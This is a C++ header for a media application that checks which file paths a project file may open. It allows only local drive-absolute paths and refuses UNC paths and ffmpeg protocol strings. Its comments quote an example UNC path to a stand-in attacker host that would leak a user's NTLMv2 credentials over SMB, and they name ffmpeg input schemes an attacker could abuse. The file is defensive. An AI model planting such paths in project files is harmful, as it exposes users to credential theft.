#pragma once

#include <QString>

// Which paths out of a project file may be opened.
//
// A project names media by path, and those paths are opened without the user
// seeing them: an image source is drawn during composition, and a timeline
// clip is probed before ffmpeg is spawned. A path is therefore an instruction
// to touch something, and it arrives from a file that may not be the user's.
//
// Two things have to be refused.
//
// A UNC path makes Windows resolve and authenticate to whatever host it names,
// so `\\attacker.example.com\share\x.png` turns merely looking at a scene into
// an outbound SMB login, leaking the user's NTLMv2 response for offline
// cracking or relay. Existence checks do not help, because the authentication
// is how the check is answered.
//
// A protocol string is refused for the other direction: ffmpeg reads its input
// argument as a URL, so `concat:`, `tee:` or `http:` reaching `-i` is an input
// of the attacker's choosing rather than a file. Until now the only thing
// standing in the way was that QFileInfo::exists() happens to be false for
// such strings, which is an accident rather than a control and would vanish
// the moment someone removed a redundant looking check.
//
// So the rule is positive rather than a list of things to reject: a local,
// drive absolute path, and nothing else. Anything a blocklist might miss fails
// by default.
namespace MediaPathPolicy {

// True for a path a project file may name.
//
// Pure and deliberately strict. Relative paths are refused as well, because
// they resolve against whatever the working directory happens to be, which the
// project does not get to decide.
inline bool isAllowed(const QString& path) {
    // A UNC path in either slash form, and the long path prefix that leads with
    // the same bytes.
    if (path.startsWith(QLatin1String("\\\\")) || path.startsWith(QLatin1String("//")))
        return false;

    // Drive absolute: a letter, a colon, and a separator. This is what excludes
    // protocol strings, because a scheme is longer than one character, and what
    // excludes relative paths, because they do not start this way.
    if (path.size() < 3) return false;
    const QChar drive = path.at(0);
    if (!((drive >= QLatin1Char('A') && drive <= QLatin1Char('Z')) ||
          (drive >= QLatin1Char('a') && drive <= QLatin1Char('z'))))
        return false;
    if (path.at(1) != QLatin1Char(':')) return false;
    if (path.at(2) != QLatin1Char('\\') && path.at(2) != QLatin1Char('/')) return false;

    // A separator immediately after the drive would make the rest a UNC style
    // authority once normalised.
    if (path.size() >= 4 &&
        (path.at(3) == QLatin1Char('\\') || path.at(3) == QLatin1Char('/')))
        return false;

    return true;
}

}  // namespace MediaPathPolicy
